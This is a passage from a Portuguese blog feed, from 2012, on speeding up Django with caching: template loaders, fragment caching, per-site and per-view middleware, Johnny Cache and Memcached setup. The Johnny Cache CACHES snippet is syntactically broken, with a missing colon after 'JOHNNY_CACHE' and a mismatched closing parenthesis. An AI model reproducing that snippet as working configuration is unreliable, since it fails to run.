        &lt;span class="s1"&gt;&amp;#39;django.template.loaders.filesystem.Loader&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;django.template.loaders.app_directories.Loader&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="p"&gt;)),&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esse &lt;em&gt;loader&lt;/em&gt; manterá o arquivo de &lt;em&gt;template&lt;/em&gt; em memória, evitando com
que o &lt;em&gt;Django&lt;/em&gt; tenha que recorrer ao disco para obter o seu conteúdo. O
“trade-off” é mais utilização da memória do seu servidor (que,
dependendo do cenário, nem é um problema tão grande assim) e a
necessidade de, quando houver atualizações em &lt;em&gt;templates&lt;/em&gt;, efetuar o
&lt;em&gt;restart&lt;/em&gt; do serviço de &lt;em&gt;WSGI&lt;/em&gt; que você utiliza.&lt;/p&gt;
&lt;p&gt;Outro ponto a se observar é que as &lt;em&gt;template tags&lt;/em&gt; que você utilizar
deverão ser &lt;a href="https://docs.djangoproject.com/en/dev/howto/custom-template-tags/#template-tag-thread-safety" title="Leia mais na documentação do Django"&gt;&lt;em&gt;thread-safe&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h4&gt;Prevenindo parsing desnecessário&lt;/h4&gt;
&lt;p&gt;O &lt;em&gt;framework&lt;/em&gt; de &lt;em&gt;cache&lt;/em&gt; permite “cachear” fragmentos de um &lt;em&gt;template&lt;/em&gt;.
Essa modalidade de &lt;em&gt;cache&lt;/em&gt; é bem interessante quando utilizamos filtros
ou &lt;em&gt;tags&lt;/em&gt; que executam operações que aumentam consideravelmente o tempo
de interpretação do &lt;em&gt;template&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Na &lt;a href="https://docs.djangoproject.com/en/1.4/topics/cache/#template-fragment-caching" title="Template fragment caching"&gt;documentação&lt;/a&gt; há um exemplo bem interessante, onde é feito o
&lt;em&gt;cache&lt;/em&gt; de um &lt;em&gt;sidebar&lt;/em&gt; inteiro:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;{% load cache %}

{% cache 500 sidebar %}
    &lt;span class="c"&gt;&amp;lt;!-- conteúdo do sidebar --&amp;gt;&lt;/span&gt;
{% endcache %}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Passamos para a &lt;em&gt;template tag&lt;/em&gt; &lt;code&gt;cache&lt;/code&gt; o tempo de vida do conteúdo
(500 segundos), e o identificador deste conteúdo (&lt;code&gt;sidebar&lt;/code&gt;). Se a
chave não existir, o &lt;em&gt;Django&lt;/em&gt; interpretará as instruções dentro do bloco
e armazenará o seu resultado no &lt;em&gt;Memcached&lt;/em&gt; para que, num próximo
acesso, esse resultado seja recuperado sem necessitar interpretar todo o
bloco novamente.&lt;/p&gt;
&lt;h3&gt;Views&lt;/h3&gt;
&lt;p&gt;Uma das maneiras mais práticas de utilizarmos o &lt;em&gt;cache&lt;/em&gt; em nossos
&lt;em&gt;websites&lt;/em&gt; e aplicações &lt;em&gt;Web&lt;/em&gt; escritos em &lt;em&gt;Django&lt;/em&gt;, é através do método
chamado &lt;a href="https://docs.djangoproject.com/en/1.4/topics/cache/#the-per-site-cache" title="Leia mais sobre na documentação do Django"&gt;&lt;em&gt;per-site cache&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Basicamente, o &lt;em&gt;Django&lt;/em&gt; analisará requisições realizadas através dos
métodos &lt;code&gt;GET&lt;/code&gt; e &lt;code&gt;HEAD&lt;/code&gt;, e utilizará a sua &lt;em&gt;URL&lt;/em&gt; como chave para a
verificação em &lt;em&gt;cache&lt;/em&gt;. Caso ele encontre a ocorrência, retornará ao
usuário o resultado “cacheado”, senão, interpretará a &lt;em&gt;view&lt;/em&gt; e ao final
armazenará o seu resultado.&lt;/p&gt;
&lt;p&gt;Para que isso seja possível, é necessário a utilização dos &lt;em&gt;middlewares&lt;/em&gt;
&lt;code&gt;django.middleware.cache.UpdateCacheMiddleware&lt;/code&gt; e
&lt;code&gt;django.middleware.cache.FetchFromCacheMiddleware&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;MIDDLEWARE_CLASSES&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;django.middleware.cache.UpdateCacheMiddleware&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;django.middleware.cache.FetchFromCacheMiddleware&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Além da configuração das seguintes constantes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;CACHE_MIDDLEWARE_ALIAS&lt;/code&gt; : O identificador da conexão (padrão
  &lt;code&gt;default&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;CACHE_MIDDLEWARE_SECONDS&lt;/code&gt; : O tempo de vida (em segundos) das
  páginas em &lt;em&gt;cache&lt;/em&gt; (padrão &lt;code&gt;600 segundos&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;CACHE_MIDDLEWARE_KEY_PREFIX&lt;/code&gt; : Chave para prevenir problemas
  quando o &lt;em&gt;cache&lt;/em&gt; é um serviço compartilhado entre diferentes
  instâncias &lt;em&gt;Django&lt;/em&gt;. Pode-se, por exemplo, colocar o nome do &lt;em&gt;site&lt;/em&gt;
  como prefixo.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Ao acessar as &lt;em&gt;views&lt;/em&gt;, temos uma agradável surpresa:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl -I http://localhost:8000/

HTTP/1.0 &lt;span class="m"&gt;200&lt;/span&gt; OK
Date: Wed, &lt;span class="m"&gt;04&lt;/span&gt; Jul &lt;span class="m"&gt;2012&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt;:12:17 GMT
Server: WSGIServer/0.1 Python/2.7.2
Cache-Control: max-age&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;600&lt;/span&gt;
Vary: Cookie
Expires: Wed, &lt;span class="m"&gt;04&lt;/span&gt; Jul &lt;span class="m"&gt;2012&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt;:22:17 GMT
Content-Type: text/html&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;utf-8
Last-Modified: Wed, &lt;span class="m"&gt;04&lt;/span&gt; Jul &lt;span class="m"&gt;2012&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt;:12:17 GMT
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ganhamos &lt;a href="https://klauslaube.com.br/2012/05/14/o-cache-e-o-http.html" title="O cache e o HTTP"&gt;cabeçalhos &lt;em&gt;HTTP&lt;/em&gt;&lt;/a&gt; com os valores correspondentes às nossas
configurações de &lt;em&gt;cache&lt;/em&gt;! Por exemplo, &lt;code&gt;Last-Modified&lt;/code&gt; corresponde a
data de acesso, &lt;code&gt;Expires&lt;/code&gt; é a data de acesso acrescentando os 600
segundos de &lt;em&gt;cache&lt;/em&gt;, e o &lt;code&gt;Expires&lt;/code&gt; corresponde ao tempo de
&lt;code&gt;CACHE_MIDDLEWARE_SECONDS&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Interessante não? Temos um controle de &lt;em&gt;cache&lt;/em&gt; na “borda” da nossa
aplicação… não precisamos interferir nas nossas &lt;em&gt;views&lt;/em&gt;, modelos ou
consultas.&lt;/p&gt;
&lt;h4&gt;O método per-view&lt;/h4&gt;
&lt;p&gt;É natural que certas &lt;em&gt;views&lt;/em&gt; necessitem de um tempo de &lt;em&gt;cache&lt;/em&gt; diferente
de outras. Para tanto, podemos utilizar &lt;em&gt;decorators&lt;/em&gt; que “sobrescrevem”
as configurações utilizadas pelo &lt;em&gt;per-site&lt;/em&gt;, permitindo assim um
controle mais granular sobre o tempo de &lt;em&gt;cache&lt;/em&gt; das &lt;em&gt;views&lt;/em&gt;. Exemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.views.generic.simple&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;direct_to_template&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.views.decorators.cache&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;cache_page&lt;/span&gt;

&lt;span class="n"&gt;urlpatterns&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;patterns&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;
    &lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;r&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;^outra-view/$&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cache_page&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;60&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;direct_to_template&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
        &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;template&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;outra-view.html&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;outra-view&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;No exemplo acima estou usando a &lt;em&gt;generic view&lt;/em&gt; &lt;code&gt;direct_to_template&lt;/code&gt;
para ilustrar. Através do &lt;em&gt;decorator&lt;/em&gt; &lt;code&gt;cache_page&lt;/code&gt; eu informo o tempo
de vida desta &lt;em&gt;view&lt;/em&gt; em &lt;em&gt;cache&lt;/em&gt; (2 minutos, 60 * 2 para ficar mais
legível).&lt;/p&gt;
&lt;p&gt;E quando acessamos esta &lt;em&gt;view&lt;/em&gt;, é possível reparar que inclusive os
valores dos cabeçalhos &lt;em&gt;HTTP&lt;/em&gt; são outros:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl -I http://localhost:8000/outra-view/

HTTP/1.0 &lt;span class="m"&gt;200&lt;/span&gt; OK
Date: Wed, &lt;span class="m"&gt;04&lt;/span&gt; Jul &lt;span class="m"&gt;2012&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt;:28:07 GMT
Server: WSGIServer/0.1 Python/2.7.2
Last-Modified: Wed, &lt;span class="m"&gt;04&lt;/span&gt; Jul &lt;span class="m"&gt;2012&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt;:28:07 GMT
Expires: Wed, &lt;span class="m"&gt;04&lt;/span&gt; Jul &lt;span class="m"&gt;2012&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt;:30:07 GMT
Content-Type: text/html&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;utf-8
Vary: Cookie
Cache-Control: max-age&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;120&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ainda é possível passar como parâmetro para o &lt;code&gt;cache_page&lt;/code&gt;, o
&lt;code&gt;cache&lt;/code&gt; que você deseja utilizar (por padrão &lt;code&gt;default&lt;/code&gt;), e um
&lt;code&gt;key_prefix&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Caching de queries com o Johnny Cache&lt;/h2&gt;
&lt;p&gt;É normal que algumas rotas da sua aplicação não possam fazer utilização
desse tipo de &lt;em&gt;cache&lt;/em&gt;. Por exemplo, &lt;em&gt;views&lt;/em&gt; para usuários autenticados,
que necessitam transitar informações de sessão e &lt;em&gt;cookies&lt;/em&gt;, ou até mesmo
&lt;em&gt;views&lt;/em&gt; que precisam receber informações através de &lt;code&gt;POST&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Vamos imaginar que, dentro desse cenário, a sua &lt;em&gt;app&lt;/em&gt; faça uma consulta
“custosa” ao banco de dados. Logo, concluímos que adicionar um controle
de &lt;em&gt;cache&lt;/em&gt; a esta consulta seria extremamente interessante para a
velocidade de resposta da &lt;em&gt;view&lt;/em&gt;. A primeira opção é utilizar o
&lt;em&gt;framework&lt;/em&gt; de &lt;em&gt;cache&lt;/em&gt; do &lt;em&gt;Django&lt;/em&gt; de forma granular, através de sua
&lt;em&gt;API&lt;/em&gt;. A outra opção é fazer &lt;em&gt;caching&lt;/em&gt; “dentro” do &lt;em&gt;ORM&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;É apoiado nessa última proposta que o &lt;a href="http://packages.python.org/johnny-cache/" title="Conheça a ferramenta de caching, Johnny Cache"&gt;&lt;em&gt;Johnny Cache&lt;/em&gt;&lt;/a&gt; se baseia:
“cachear” dados transitados através do &lt;em&gt;ORM&lt;/em&gt; do &lt;em&gt;Django&lt;/em&gt;, não
interferindo no código das &lt;em&gt;apps&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;Johnny Cache&lt;/em&gt; está no &lt;a href="http://pypi.python.org/pypi" title="the Python Package Index"&gt;&lt;em&gt;PyPi&lt;/em&gt;&lt;/a&gt;, então basta um &lt;code&gt;pip install johnny-cache&lt;/code&gt; para realizarmos a instalação. Para configurar,
precisamos adicionar algumas informações ao &lt;code&gt;settings.py&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;MIDDLEWARE_CLASSES&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;johnny.middleware.LocalStoreClearMiddleware&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;johnny.middleware.QueryCacheMiddleware&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;CACHES&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;default&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;BACKEND&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;johnny.backends.memcached.MemcachedCache&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;LOCATION&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;127.0.0.1:11211&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;JOHNNY_CACHE&amp;#39;&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Onde:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;johnny.middleware.LocalStoreClearMiddleware:&lt;/code&gt; O &lt;em&gt;Johnny&lt;/em&gt; utiliza
  este &lt;em&gt;middleware&lt;/em&gt; para gerenciar o &lt;em&gt;cache&lt;/em&gt; de uma &lt;a href="https://github.com/jmoiron/johnny-cache/blob/master/johnny/transaction.py" title="Veja o uso dessa modalidade no módulo transaction.py"&gt;maneira "thread-safe"&lt;/a&gt;.
  Ele basicamente limpa este objeto ao final de cada
  requisição.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;johnny.middleware.QueryCacheMiddleware:&lt;/code&gt; É o &lt;em&gt;middleware&lt;/em&gt;
  responsável pela “mágica” de &lt;em&gt;caching&lt;/em&gt; no &lt;em&gt;ORM&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;O &lt;em&gt;backend&lt;/em&gt; &lt;code&gt;johnny.backends.memcached.MemcachedCache&lt;/code&gt; é basicamente
uma &lt;a href="https://github.com/jmoiron/johnny-cache/blob/master/johnny/backends/memcached.py" title="Veja o código-fonte"&gt;subclasse do &lt;em&gt;backend built-in&lt;/em&gt; do &lt;em&gt;Django&lt;/em&gt; para o &lt;em&gt;Memcached&lt;/em&gt;&lt;/a&gt;,
com a adição do seguinte comportamento: Se o &lt;em&gt;timeout&lt;/em&gt; for setado como 0
(zero), o &lt;em&gt;cache&lt;/em&gt; fica “infinito”.&lt;/p&gt;
&lt;p&gt;Com a opção &lt;code&gt;JOHNNY_CACHE&lt;/code&gt; como &lt;code&gt;True&lt;/code&gt;, estamos informando ao
&lt;em&gt;Johnny&lt;/em&gt; que este é o &lt;em&gt;pool&lt;/em&gt; de &lt;em&gt;cache&lt;/em&gt; que ele deve usar para &lt;em&gt;caching&lt;/em&gt;
das &lt;em&gt;queries&lt;/em&gt;. É possível ter uma configuração diferenciada, como
encontrada no &lt;a href="https://github.com/nelas/cifonauta/blob/master/dummy_settings_server.py#L33" title="Veja o código-fonte do projeto no GitHub"&gt;projeto Cifonauta&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Com a ajuda do &lt;a href="http://pypi.python.org/pypi/django-debug-toolbar/" title="Excelente lib para debugging de projetos Django"&gt;django-debug-toolbar&lt;/a&gt;, podemos ver o número de
&lt;em&gt;queries&lt;/em&gt; diminuírem consideravelmente (fatalmente ocasionando um tempo
de resposta menor). Quando um registro for adicionado, editado ou
removido, o &lt;em&gt;Johnny Cache&lt;/em&gt; remove as &lt;em&gt;queries&lt;/em&gt; envolvendo determinada
tabela do &lt;em&gt;cache&lt;/em&gt;, permitindo assim uma nova “batida” no banco de dados
(e um novo armazenamento dos resultados).&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Como &lt;a href="https://klauslaube.com.br/2011/12/19/nginx-poderoso-rapido-facil.html" title="Nginx: Poderoso, rápido e fácil"&gt;já mencionei&lt;/a&gt;, gosto muito dos ensinamentos e experiências
compartilhadas pelo pessoal da &lt;a href="http://37signals.com/" title="Making collaboration productive and enjoyable for people every day"&gt;&lt;em&gt;37Signals&lt;/em&gt;&lt;/a&gt;. Um deles é para nos
preocuparmos com performance quando isto for realmente um problema.&lt;/p&gt;
&lt;p&gt;Logo, (&lt;em&gt;IMO&lt;/em&gt;) não construa uma mega
&lt;a href="https://klauslaube.com.br/tag/infraestrutura.html" title="Leia mais sobre infra"&gt;infraestrutura&lt;/a&gt; para uma aplicação que atende 50 usuários por dia.
Você está desperdiçando o seu tempo e linhas de código. Em
contrapartida, qualquer esforço para melhorar a experiência do usuário,
e para economizar recursos, &lt;strong&gt;é sempre bem-vinda&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Vale sempre ressaltar que problemas de performance podem estar
relacionados a qualidade do código produzido, e não necessariamente com
o consumo da aplicação. Então, se a demanda está baixa e mesmo assim
você tem tempos de resposta absurdamente altos, talvez seja a hora de
“refatorar” o seu código.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.djangoproject.com/en/1.4/topics/cache/" title="Leia tudo sobre o framework de cache do Django"&gt;&lt;em&gt;Django Documentation – Cache Framework&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.djangoproject.com/en/dev/ref/templates/api/#loader-types" title="Mais informações sobre os template loaders do Django"&gt;&lt;em&gt;Django Documentation – The Django template language: Loader types&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://packages.python.org/johnny-cache/" title="Mais informações sobre o uso do Johnny Cache"&gt;&lt;em&gt;Johnny Cache Documentation&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.jongales.com/blog/2012/02/16/make-django-keep-templates-in-memory/" title="Leia mais sobre o cached.Loader"&gt;&lt;em&gt;Jongales.com – Make Django keep templates in memory&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="python"></category><category term="django"></category><category term="memcached"></category><category term="johnny-cache"></category><category term="cache"></category></entry><entry><title>Django e Cache: Uma dupla de alta performance - Parte 1</title><link href="https://klauslaube.com.br/2012/06/17/django-e-cache-uma-dupla-de-alta-performance-1.html" rel="alternate"></link><published>2012-06-17T15:52:22-03:00</published><updated>2012-06-17T15:52:22-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2012-06-17:/2012/06/17/django-e-cache-uma-dupla-de-alta-performance-1.html</id><summary type="html">&lt;p&gt;Embora o &lt;a href="https://klauslaube.com.br/2012/05/14/o-cache-e-o-http.html" title="O cache e o HTTP"&gt;&lt;em&gt;caching HTTP&lt;/em&gt;&lt;/a&gt; seja essencial
para qualquer aplicação &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;, &lt;strong&gt;(IMO)&lt;/strong&gt;
essa modalidade de &lt;a href="https://klauslaube.com.br/tag/cache.html" title="Leia mais sobre Cache"&gt;&lt;em&gt;cache&lt;/em&gt;&lt;/a&gt; deve ser encarada como um acréscimo à
experiência de uso, e não necessariamente como uma “arma” contra
problemas de performance. Os usuários poderão abdicar desta
funcionalidade, e aí a sua aplicação não poderá depender do …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Embora o &lt;a href="https://klauslaube.com.br/2012/05/14/o-cache-e-o-http.html" title="O cache e o HTTP"&gt;&lt;em&gt;caching HTTP&lt;/em&gt;&lt;/a&gt; seja essencial
para qualquer aplicação &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;, &lt;strong&gt;(IMO)&lt;/strong&gt;
essa modalidade de &lt;a href="https://klauslaube.com.br/tag/cache.html" title="Leia mais sobre Cache"&gt;&lt;em&gt;cache&lt;/em&gt;&lt;/a&gt; deve ser encarada como um acréscimo à
experiência de uso, e não necessariamente como uma “arma” contra
problemas de performance. Os usuários poderão abdicar desta
funcionalidade, e aí a sua aplicação não poderá depender do protocolo
para atingir tempos de resposta atrativos.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Desenvolvedores &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; podem contar com boas soluções, do próprio
&lt;em&gt;framework&lt;/em&gt; e de terceiros, que podem melhorar o &lt;em&gt;caching&lt;/em&gt; das
aplicações (e consequentemente a performance). A grande notícia é que
essas ferramentas são fáceis e práticas. Vamos conhecê-las?&lt;/p&gt;
&lt;h2&gt;O Memcached&lt;/h2&gt;
&lt;p&gt;Eu juro que tentei escrever uma introdução
para este tópico, mas a descricão contida no &lt;a href="http://memcached.org/" title="A distributed memory object caching system"&gt;site oficial do &lt;em&gt;Memcached&lt;/em&gt;&lt;/a&gt; é
tão boa, que vou simplesmente copiá-la:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Memcached is an in-memory key-value store for small chunks of arbitrary
data (strings, objects) from results of database calls,
API calls, or page rendering.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Em outras palavras, é uma ferramenta &lt;em&gt;open source&lt;/em&gt;, que tem como função
o armazenamento (e gerenciamento) de resultados de &lt;em&gt;queries&lt;/em&gt;, conteúdo
de arquivos, processamentos avançados, ou qualquer tipo de informação,
em memória (um meio muito mais rápido de ser lido que em disco, por
exemplo). Embora esse potencial possa ser utilizado para os mais
diferentes fins, é como mecanismo de &lt;em&gt;caching&lt;/em&gt; que ele se destaca.&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;Memcached&lt;/em&gt; foi construído em um esquema “cliente-servidor”, e é
possível utilizá-lo com uma grande quantidade de linguagens de
programação. Mas o que eu acho mais bacana na ferramenta é a
possibilidade de utilizá-la de forma distribuída. Isso propicia uma
flexibilidade muito maior na hora de construirmos a &lt;a href="https://klauslaube.com.br/tag/infraestrutura.html" title="Leia mais sobre infra"&gt;infraestrutura&lt;/a&gt;
para servir as nossas aplicações &lt;em&gt;web&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Mas a “cereja do bolo” é: O &lt;em&gt;Django&lt;/em&gt; funciona muito bem com o
&lt;em&gt;Memcached&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Framework de cache do Django&lt;/h2&gt;
&lt;p&gt;O uso do &lt;em&gt;Memcached&lt;/em&gt; não é obrigatório! Na verdade, podemos utilizar
diferentes &lt;em&gt;backends&lt;/em&gt; para diferentes tipos de mecanismos de &lt;em&gt;cache&lt;/em&gt;. O
&lt;em&gt;Django&lt;/em&gt; possui algumas opções disponíveis, sem necessitar utilizar
nenhum “código de terceiro”. Temos a opção de fazer &lt;em&gt;cache&lt;/em&gt; em disco,
banco de dados ou até mesmo “simularmos” a interação com &lt;em&gt;cache&lt;/em&gt; (muito
bom para ambientes de desenvolvimento). &lt;a href="https://docs.djangoproject.com/en/1.3/topics/cache/#setting-up-the-cache" title="Setting up cache"&gt;Leia mais sobre&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Neste &lt;em&gt;post&lt;/em&gt;, vamos nos concentrar na configuração do &lt;em&gt;Django&lt;/em&gt; com o
&lt;em&gt;Memcached&lt;/em&gt;. Para instalar, &lt;a href="http://code.google.com/p/memcached/wiki/NewInstallFromSource" title="Memcached - Why build from source"&gt;basta compilar através do make&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ wget http://memcached.org/latest
$ tar -zxvf memcached-1.4.13.tar.gz
$ &lt;span class="nb"&gt;cd&lt;/span&gt; memcached-1.4.13
$ ./configure
$ make &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; make &lt;span class="nb"&gt;test&lt;/span&gt;
$ make install
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Utilizando a &lt;a href="ftp://ftp.tummy.com/pub/python-memcached/" title="Conheça a python-memcached"&gt;&lt;em&gt;python-memcached&lt;/em&gt;&lt;/a&gt; como &lt;em&gt;binding&lt;/em&gt; &lt;em&gt;Python&lt;/em&gt; para o
&lt;em&gt;Memcached&lt;/em&gt;, basta adicionarmos o seguinte &lt;em&gt;backend&lt;/em&gt; ao &lt;strong&gt;settings.py&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;CACHES&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;default&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;BACKEND&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;django.core.cache.backends.memcached.MemcachedCache&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;LOCATION&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;127.0.0.1:11211&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
